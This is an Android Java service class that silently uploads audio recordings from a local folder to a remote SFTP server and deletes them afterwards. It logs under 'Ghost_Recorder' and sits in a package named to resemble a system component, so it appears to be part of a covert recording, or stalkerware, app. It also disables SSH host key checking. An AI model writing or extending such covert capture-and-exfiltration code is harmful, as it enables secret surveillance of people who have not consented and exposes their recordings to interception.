package com.android.network.detect;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;

public class UploadRecordingTask extends IntentService {

    private final String LOG_TAG = AppGlobals.getLogTag(getClass());
    private Session mSession;
    private Channel mChannel;
    private ChannelSftp mChannelSftp;
    private String mFileName;
    private RecordingDatabaseHelper recordingDatabaseHelper;
    private Helpers mHelpers;

    public UploadRecordingTask() {
        super("upload Task");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        mHelpers = new Helpers(getApplicationContext());
        recordingDatabaseHelper = new RecordingDatabaseHelper(getApplicationContext());
        mHelpers = new Helpers(getApplicationContext());
        String path = intent.getStringExtra("path");
        ArrayList<String> listToBeDelete = recordingDatabaseHelper.
                retrieveDate(SqliteHelpers.COULMN_DELETE);
        ArrayList<String> listToUpload = recordingDatabaseHelper.
                retrieveDate(SqliteHelpers.COULMN_UPLOAD);
        ArrayList<String> listPresentInFolder = mHelpers.getAllFilesFromFolder();
        if (listToBeDelete.size() > 0 || listToUpload.size() > 0 || listPresentInFolder.size() > 0
                || path != null) {
            try {
                URL url = new URL("http://google.com");
                HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
                urlc.setConnectTimeout(10000);
                urlc.connect();
                if (urlc.getResponseCode() == 200) {
                    Log.i("Ghost_Recorder", "preparing the host information for sftp.");
                    connectToServer();

                    if (listToBeDelete.size() > 0) {
                        Log.i(LOG_TAG, "to be delete" + listToBeDelete.size());
                        deletePreviousUploadFailedRecordings(listToBeDelete);
                    } else if (path != null || listToUpload.size() > 0) {
                        Log.i(LOG_TAG, "Running Upload task....");
                        if (path != null) {
                            System.out.println("single file");
                            uploadFileToServer(new ArrayList<>(Arrays.asList(path)));
                        } else {
                            Log.i(LOG_TAG, "to be upload" + listToUpload.size());
                            uploadFileToServer(listToUpload);
                        }
                    } else if (listPresentInFolder.size() > 0 && listToUpload.size() == 0 &&
                            listToBeDelete.size() == 0) {
                        uploadFileToServer(listPresentInFolder);
                    }
                }
            } catch (MalformedURLException e1) {
                e1.printStackTrace();
            } catch (IOException e) {
                stopSelf();
            }
        }else {
            return;
        }
    }

    void deletePreviousUploadFailedRecordings(ArrayList<String> recordings) {
        for (String s : recordings) {
            try {
                System.out.println(s);
                if (mChannelSftp != null) {
                    mChannelSftp.rm(s);
                    Log.i(AppGlobals.getLogTag(getClass()), "File deleted At Server");
                }
            } catch (SftpException e) {
                recordingDatabaseHelper.deleteItem(SqliteHelpers.COULMN_DELETE, s);
            }
        }
    }

    void connectToServer() {
        String SFTP_HOST = getApplicationContext().getString(R.string.sftp_host);
        String SFTP_PORT = getApplicationContext().getString(R.string.sftp_port);
        String SFTP_USER = getApplicationContext().getString(R.string.sftp_username);
        String SFTP_PASSWORD = getApplicationContext().getString(R.string.sftp_password);
        String SFTP_WORKING_DIR = getApplicationContext().getString(R.string.sftp_working_directory);

        JSch jsch = new JSch();
        try {
            mSession = jsch.getSession(SFTP_USER, SFTP_HOST, Integer.valueOf(SFTP_PORT));
            mSession.setPassword(SFTP_PASSWORD);
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            mSession.setConfig(config);
            mSession.connect();
            System.out.println(mSession == null);
            Log.i("Ghost_Recorder", "Host connected.");
            mChannel = mSession.openChannel("sftp");
            mChannel.connect();
            Log.i("Ghost_Recorder", "sftp channel opened and connected.");
            mChannelSftp = (ChannelSftp) mChannel;
            mChannelSftp.cd(SFTP_WORKING_DIR);
        } catch (JSchException ignore) {

        } catch (SftpException e) {
            e.printStackTrace();
        }
    }

    private void uploadFileToServer(ArrayList<String> list) {
        RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper(getApplicationContext());
        try {
            /*using jsch library for sending Recording to server*/
            for (String s : list) {
                File file = new File(s);
                mFileName = file.getName();
                Log.i(AppGlobals.getLogTag(getClass()), "Current file: " + s);
                if (mChannel == null && mChannel == null) {
                    Log.i(AppGlobals.getLogTag(getClass()), "Not Really Connected To Server...");
                    if (!recordingDatabaseHelper.CheckIfItemAlreadyExist(s)) {
                        Log.i(AppGlobals.getLogTag(getClass()), "item added");
                        recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, s);
                    }
                    stopSelf();
                    return;
                }
                mChannelSftp.put(new FileInputStream(file), file.getName());
                Log.i(LOG_TAG, "File transfered successfully to host.");
                Log.i(LOG_TAG, "BroadCast sent...");
                Intent intent = new Intent("com.byteshaft.deleteData");
                intent.putExtra("FILE_NAME", mFileName);
                sendBroadcast(intent);
            }
        } catch (SftpException e) {
            e.printStackTrace();
            String notUploadedFile = mHelpers.path + "/" + mFileName;
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_DELETE, mFileName);
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, notUploadedFile);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            recordingDatabaseHelper.deleteItem(SqliteHelpers.COULMN_UPLOAD, mHelpers.path + mFileName);
        }
        disconnectConnection();
    }

    private void disconnectConnection() {
        if (mChannelSftp != null) {
            mChannelSftp.exit();
            Log.i("Server", "sftp Channel exited.");
        }

        if (mChannel != null) {
            mChannel.disconnect();
            Log.i("Server", "Channel disconnected.");
        }

        if (mSession != null) {
            mSession.disconnect();
            Log.i("Server", "Host Session disconnected.");
        }
        stopSelf();
    }
}